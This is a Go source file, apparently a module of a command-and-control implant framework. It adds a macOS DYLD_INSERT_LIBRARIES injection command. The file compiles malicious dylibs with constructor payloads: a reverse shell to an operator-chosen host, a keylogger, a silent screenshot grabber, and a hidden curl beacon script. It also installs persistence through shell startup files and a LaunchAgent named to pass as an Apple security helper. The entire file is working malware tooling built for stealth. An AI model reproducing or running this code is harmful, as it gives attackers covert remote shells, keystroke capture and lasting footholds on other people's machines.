// server/docker/payloads/Darwin/action_dyld_injection_darwin.go
//go:build darwin
// +build darwin

package main

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"text/template"
	"time"
)

// DYLDInjectionCommand handles DYLD_INSERT_LIBRARIES injection on macOS
type DYLDInjectionCommand struct{}

func (c *DYLDInjectionCommand) Name() string {
	return "dyld-inject"
}

func (c *DYLDInjectionCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	if len(args) < 1 {
		return CommandResult{
			Output: "Usage: dyld-inject <action> [options]",
			ExitCode: 1,
		}
	}

	action := args[0]
	switch action {
	case "test":
		return c.testDYLDInjection()
	case "generate":
		return c.generateDylib(args[1:])
	case "inject":
		return c.injectDylib(args[1:])
	case "persist":
		return c.persistDylib(args[1:])
	default:
		return CommandResult{
			Output:   fmt.Sprintf("Unknown action: %s", action),
			ExitCode: 1,
		}
	}
}

// testDYLDInjection checks if DYLD injection is possible
func (c *DYLDInjectionCommand) testDYLDInjection() CommandResult {
	output := "[*] Testing DYLD_INSERT_LIBRARIES capability...\n"
	output += strings.Repeat("-", 60) + "\n\n"

	// Check SIP status
	output += "[*] Checking System Integrity Protection (SIP)...\n"
	cmd := exec.Command("csrutil", "status")
	if result, err := cmd.Output(); err == nil {
		sipStatus := string(result)
		output += fmt.Sprintf("  %s", sipStatus)

		if strings.Contains(sipStatus, "disabled") {
			output += "  [+] SIP is disabled - DYLD injection should work!\n"
		} else if strings.Contains(sipStatus, "enabled") {
			output += "  [!] SIP is enabled - DYLD injection is restricted\n"
			output += "  [!] Injection will only work on non-restricted binaries\n"
		}
	} else {
		output += "  [!] Could not determine SIP status\n"
	}

	// Test with a simple command
	output += "\n[*] Testing DYLD_INSERT_LIBRARIES with echo command...\n"

	// Create a simple test dylib
	testDylib := "/tmp/test_injection.dylib"
	testSource := `
#include <stdio.h>
__attribute__((constructor))
void test_injection() {
    printf("[INJECTED] Library loaded successfully!\n");
}
`
	testSourceFile := "/tmp/test_injection.c"
	if err := os.WriteFile(testSourceFile, []byte(testSource), 0644); err == nil {
		// Compile the test dylib
		cmd = exec.Command("clang", "-dynamiclib", "-o", testDylib, testSourceFile)
		if _, err := cmd.Output(); err == nil {
			output += fmt.Sprintf("  [+] Test dylib compiled: %s\n", testDylib)

			// Try to inject
			cmd = exec.Command("sh", "-c",
				fmt.Sprintf("DYLD_INSERT_LIBRARIES=%s /bin/echo 'Testing injection'", testDylib))
			if result, err := cmd.CombinedOutput(); err == nil {
				if strings.Contains(string(result), "[INJECTED]") {
					output += "  [+] DYLD injection successful!\n"
					output += fmt.Sprintf("  Output: %s", string(result))
				} else {
					output += "  [-] DYLD injection failed (no injection message)\n"
					output += fmt.Sprintf("  Output: %s", string(result))
				}
			} else {
				output += fmt.Sprintf("  [-] Command failed: %v\n", err)
			}

			// Cleanup
			os.Remove(testDylib)
			os.Remove(testSourceFile)
		} else {
			output += "  [-] Failed to compile test dylib\n"
		}
	}

	// Check for commonly injectable processes
	output += "\n[*] Checking for injectable processes/binaries...\n"
	injectableTargets := []string{
		"/usr/bin/curl",
		"/usr/bin/wget",
		"/usr/local/bin/python3",
		"/usr/bin/python",
		"/usr/bin/ruby",
		"/usr/bin/perl",
		"/Applications/Firefox.app/Contents/MacOS/firefox",
		"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome",
	}

	for _, target := range injectableTargets {
		if _, err := os.Stat(target); err == nil {
			// Check if binary has restricted flag
			cmd = exec.Command("codesign", "-d", "-v", target)
			if result, err := cmd.CombinedOutput(); err == nil {
				if strings.Contains(string(result), "restrict") {
					output += fmt.Sprintf("  [-] %s (restricted)\n", target)
				} else {
					output += fmt.Sprintf("  [+] %s (injectable)\n", target)
				}
			}
		}
	}

	return CommandResult{
		Output:      output,
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

// generateDylib generates a malicious dylib
func (c *DYLDInjectionCommand) generateDylib(args []string) CommandResult {
	var outputPath, payload, host, port string

	// Parse arguments
	for i := 0; i < len(args); i++ {
		switch args[i] {
		case "--output":
			if i+1 < len(args) {
				outputPath = args[i+1]
				i++
			}
		case "--payload":
			if i+1 < len(args) {
				payload = args[i+1]
				i++
			}
		case "--host":
			if i+1 < len(args) {
				host = args[i+1]
				i++
			}
		case "--port":
			if i+1 < len(args) {
				port = args[i+1]
				i++
			}
		}
	}

	if outputPath == "" {
		return CommandResult{
			Output:   "Error: --output is required",
			ExitCode: 1,
		}
	}

	if payload == "" {
		payload = "log" // Default to logging
	}

	output := fmt.Sprintf("[*] Generating dylib with payload: %s\n", payload)

	// Generate source code based on payload
	var sourceCode string
	switch payload {
	case "log":
		sourceCode = c.generateLogPayload()
	case "reverse-shell":
		if host == "" || port == "" {
			return CommandResult{
				Output:   "Error: --host and --port required for reverse-shell payload",
				ExitCode: 1,
			}
		}
		sourceCode = c.generateReverseShellPayload(host, port)
	case "keylogger":
		sourceCode = c.generateKeyloggerPayload()
	case "screenshot":
		sourceCode = c.generateScreenshotPayload()
	case "persistence":
		sourceCode = c.generatePersistencePayload()
	default:
		return CommandResult{
			Output:   fmt.Sprintf("Unknown payload type: %s", payload),
			ExitCode: 1,
		}
	}

	// Write source to temp file
	sourceFile := strings.TrimSuffix(outputPath, ".dylib") + ".c"
	if err := os.WriteFile(sourceFile, []byte(sourceCode), 0644); err != nil {
		return CommandResult{
			Output:   fmt.Sprintf("Failed to write source: %v", err),
			ExitCode: 1,
		}
	}

	// Compile dylib
	output += fmt.Sprintf("[*] Compiling dylib to: %s\n", outputPath)

	cmd := exec.Command("clang",
		"-dynamiclib",
		"-o", outputPath,
		"-framework", "Foundation",
		"-framework", "AppKit",
		sourceFile)

	if result, err := cmd.CombinedOutput(); err != nil {
		return CommandResult{
			Output:   fmt.Sprintf("%sFailed to compile: %s", output, string(result)),
			ExitCode: 1,
		}
	}

	// Remove source file
	os.Remove(sourceFile)

	output += fmt.Sprintf("[+] Dylib generated successfully: %s\n", outputPath)
	output += fmt.Sprintf("[*] Size: %d bytes\n", c.getFileSize(outputPath))
	output += "\n[*] Usage:\n"
	output += fmt.Sprintf("  DYLD_INSERT_LIBRARIES=%s <command>\n", outputPath)
	output += fmt.Sprintf("  dyld-inject inject --dylib %s --target <binary>\n", outputPath)

	return CommandResult{
		Output:      output,
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

// generateLogPayload creates logging payload
func (c *DYLDInjectionCommand) generateLogPayload() string {
	return `
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>
#include <sys/types.h>
#include <pwd.h>

__attribute__((constructor))
void dyld_injection_log() {
    FILE *log = fopen("/tmp/.dyld_injection.log", "a");
    if (log) {
        time_t now = time(NULL);
        struct passwd *pw = getpwuid(getuid());
        fprintf(log, "[%s] Process: %s (PID: %d, UID: %d, User: %s)\n", 
                ctime(&now), getprogname(), getpid(), getuid(), 
                pw ? pw->pw_name : "unknown");
        
        // Log environment variables
        char *path = getenv("PATH");
        if (path) fprintf(log, "  PATH: %s\n", path);
        
        char *home = getenv("HOME");
        if (home) fprintf(log, "  HOME: %s\n", home);
        
        fclose(log);
    }
}
`
}

// generateReverseShellPayload creates reverse shell payload
func (c *DYLDInjectionCommand) generateReverseShellPayload(host, port string) string {
	tmpl := `
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>

void* reverse_shell(void* arg) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return NULL;
    
    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons({{.Port}});
    server.sin_addr.s_addr = inet_addr("{{.Host}}");
    
    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == 0) {
        dup2(sock, 0);
        dup2(sock, 1);
        dup2(sock, 2);
        
        char *shell = getenv("SHELL");
        if (!shell) shell = "/bin/sh";
        
        execl(shell, shell, NULL);
    }
    
    close(sock);
    return NULL;
}

__attribute__((constructor))
void dyld_injection_reverse() {
    pthread_t thread;
    pthread_create(&thread, NULL, reverse_shell, NULL);
    pthread_detach(thread);
}
`
	t := template.Must(template.New("reverse").Parse(tmpl))
	var result strings.Builder
	t.Execute(&result, struct {
		Host string
		Port string
	}{Host: host, Port: port})

	return result.String()
}

// generateKeyloggerPayload creates keylogger payload
func (c *DYLDInjectionCommand) generateKeyloggerPayload() string {
	return `
#include <stdio.h>
#include <ApplicationServices/ApplicationServices.h>
#include <Carbon/Carbon.h>

FILE *keylog = NULL;

CGEventRef keylogger_callback(CGEventTapProxy proxy, CGEventType type, 
                              CGEventRef event, void *refcon) {
    if (type == kCGEventKeyDown) {
        CGKeyCode keycode = (CGKeyCode)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
        
        if (!keylog) {
            keylog = fopen("/tmp/.keylog.txt", "a");
        }
        
        if (keylog) {
            fprintf(keylog, "Key: %d\n", (int)keycode);
            fflush(keylog);
        }
    }
    return event;
}

__attribute__((constructor))
void start_keylogger() {
    // Note: This requires accessibility permissions on modern macOS
    CGEventMask eventMask = (1 << kCGEventKeyDown);
    CFMachPortRef eventTap = CGEventTapCreate(kCGSessionEventTap,
                                              kCGHeadInsertEventTap,
                                              0,
                                              eventMask,
                                              keylogger_callback,
                                              NULL);
    
    if (eventTap) {
        CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(NULL, eventTap, 0);
        CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
        CGEventTapEnable(eventTap, true);
    }
}
`
}

// generateScreenshotPayload creates screenshot payload
func (c *DYLDInjectionCommand) generateScreenshotPayload() string {
	return `
#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>

__attribute__((constructor))
void take_screenshot() {
    @autoreleasepool {
        // Create screenshot
        CGImageRef screenshot = CGWindowListCreateImage(CGRectInfinite,
                                                        kCGWindowListOptionOnScreenOnly,
                                                        kCGNullWindowID,
                                                        kCGWindowImageDefault);
        
        if (screenshot) {
            // Save to file
            NSBitmapImageRep *rep = [[NSBitmapImageRep alloc] initWithCGImage:screenshot];
            NSData *data = [rep representationUsingType:NSBitmapImageFileTypePNG properties:@{}];
            
            NSString *path = [NSString stringWithFormat:@"/tmp/.screenshot_%d.png", getpid()];
            [data writeToFile:path atomically:YES];
            
            CGImageRelease(screenshot);
        }
    }
}
`
}

// generatePersistencePayload creates persistence payload
func (c *DYLDInjectionCommand) generatePersistencePayload() string {
	return `
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/stat.h>

__attribute__((constructor))
void establish_persistence() {
    // Copy ourselves to a hidden location
    char *home = getenv("HOME");
    if (!home) return;
    
    char persist_path[512];
    snprintf(persist_path, sizeof(persist_path), "%s/.security/updater", home);
    
    // Create hidden directory
    char dir_path[512];
    snprintf(dir_path, sizeof(dir_path), "%s/.security", home);
    mkdir(dir_path, 0755);
    
    // Create persistence script
    FILE *script = fopen(persist_path, "w");
    if (script) {
        fprintf(script, "#!/bin/bash\n");
        fprintf(script, "while true; do\n");
        fprintf(script, "  sleep 3600\n");
        fprintf(script, "  curl -s http://localhost:8080/beacon || true\n");
        fprintf(script, "done\n");
        fclose(script);
        chmod(persist_path, 0755);
    }
    
    // Add to .zshrc
    char rcfile[512];
    snprintf(rcfile, sizeof(rcfile), "%s/.zshrc", home);
    FILE *rc = fopen(rcfile, "a");
    if (rc) {
        fprintf(rc, "\n# System check\n");
        fprintf(rc, "nohup %s >/dev/null 2>&1 &\n", persist_path);
        fclose(rc);
    }
}
`
}

// injectDylib injects a dylib into a target
func (c *DYLDInjectionCommand) injectDylib(args []string) CommandResult {
	var dylibPath, targetPath string
	var targetPID int

	// Parse arguments
	for i := 0; i < len(args); i++ {
		switch args[i] {
		case "--dylib":
			if i+1 < len(args) {
				dylibPath = args[i+1]
				i++
			}
		case "--target":
			if i+1 < len(args) {
				targetPath = args[i+1]
				i++
			}
		case "--pid":
			if i+1 < len(args) {
				fmt.Sscanf(args[i+1], "%d", &targetPID)
				i++
			}
		}
	}

	if dylibPath == "" {
		return CommandResult{
			Output:   "Error: --dylib is required",
			ExitCode: 1,
		}
	}

	output := fmt.Sprintf("[*] Injecting dylib: %s\n", dylibPath)

	// Check if dylib exists
	if _, err := os.Stat(dylibPath); err != nil {
		return CommandResult{
			Output:   fmt.Sprintf("Error: Dylib not found: %s", dylibPath),
			ExitCode: 1,
		}
	}

	if targetPath != "" {
		// Run target with injection
		output += fmt.Sprintf("[*] Target: %s\n", targetPath)
		output += "[*] Executing with DYLD_INSERT_LIBRARIES...\n"

		cmd := exec.Command("sh", "-c",
			fmt.Sprintf("DYLD_INSERT_LIBRARIES=%s %s", dylibPath, targetPath))

		if result, err := cmd.CombinedOutput(); err != nil {
			output += fmt.Sprintf("[-] Execution failed: %v\n", err)
			output += fmt.Sprintf("Output: %s", string(result))
		} else {
			output += fmt.Sprintf("[+] Execution successful\n")
			output += fmt.Sprintf("Output: %s", string(result))
		}
	} else if targetPID > 0 {
		// Note: Direct PID injection is much harder on macOS
		output += fmt.Sprintf("[!] PID injection (%d) requires task_for_pid privileges\n", targetPID)
		output += "[!] This typically requires:\n"
		output += "  - SIP disabled\n"
		output += "  - Root privileges\n"
		output += "  - Proper entitlements\n"
		output += "[!] Consider using DYLD_INSERT_LIBRARIES with process restart instead\n"
	} else {
		output += "Error: --target or --pid required\n"
	}

	return CommandResult{
		Output:      output,
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

// persistDylib adds persistent DYLD injection
func (c *DYLDInjectionCommand) persistDylib(args []string) CommandResult {
	var dylibPath, method string

	// Parse arguments
	for i := 0; i < len(args); i++ {
		switch args[i] {
		case "--dylib":
			if i+1 < len(args) {
				dylibPath = args[i+1]
				i++
			}
		case "--method":
			if i+1 < len(args) {
				method = args[i+1]
				i++
			}
		}
	}

	if dylibPath == "" {
		return CommandResult{
			Output:   "Error: --dylib is required",
			ExitCode: 1,
		}
	}

	if method == "" {
		method = "environment"
	}

	output := fmt.Sprintf("[*] Adding persistent DYLD injection\n")
	output += fmt.Sprintf("[*] Dylib: %s\n", dylibPath)
	output += fmt.Sprintf("[*] Method: %s\n\n", method)

	switch method {
	case "environment":
		// Add to shell environment
		home := os.Getenv("HOME")
		if home == "" {
			return CommandResult{
				Output:   "Error: HOME environment variable not set",
				ExitCode: 1,
			}
		}

		// Add to .zshenv (loaded for all zsh instances)
		envFile := filepath.Join(home, ".zshenv")
		content := fmt.Sprintf("\n# System library\nexport DYLD_INSERT_LIBRARIES=%s:$DYLD_INSERT_LIBRARIES\n", dylibPath)

		if err := appendToFile(envFile, content); err != nil {
			output += fmt.Sprintf("[-] Failed to modify .zshenv: %v\n", err)
		} else {
			output += fmt.Sprintf("[+] Added to %s\n", envFile)
		}

		// Also add to .bash_profile
		bashFile := filepath.Join(home, ".bash_profile")
		if err := appendToFile(bashFile, content); err != nil {
			output += fmt.Sprintf("[-] Failed to modify .bash_profile: %v\n", err)
		} else {
			output += fmt.Sprintf("[+] Added to %s\n", bashFile)
		}

	case "plist":
		// Create a LaunchAgent with environment variable
		output += "[*] Creating LaunchAgent with DYLD injection...\n"

		plistContent := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.security.helper</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/true</string>
    </array>
    <key>EnvironmentVariables</key>
    <dict>
        <key>DYLD_INSERT_LIBRARIES</key>
        <string>%s</string>
    </dict>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <false/>
</dict>
</plist>`, dylibPath)

		home := os.Getenv("HOME")
		plistPath := filepath.Join(home, "Library/LaunchAgents/com.apple.security.helper.plist")

		if err := os.WriteFile(plistPath, []byte(plistContent), 0644); err != nil {
			output += fmt.Sprintf("[-] Failed to create plist: %v\n", err)
		} else {
			output += fmt.Sprintf("[+] Created: %s\n", plistPath)
			output += "[*] Load with: launchctl load " + plistPath + "\n"
		}

	default:
		output += fmt.Sprintf("[-] Unknown method: %s\n", method)
	}

	output += "\n[!] Note: DYLD injection is restricted by SIP for system binaries\n"
	output += "[!] This will only affect non-restricted binaries\n"

	return CommandResult{
		Output:      output,
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

// Helper functions
func (c *DYLDInjectionCommand) getFileSize(path string) int64 {
	if info, err := os.Stat(path); err == nil {
		return info.Size()
	}
	return 0
}

func appendToFile(filepath, content string) error {
	file, err := os.OpenFile(filepath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return err
	}
	defer file.Close()

	_, err = file.WriteString(content)
	return err
}
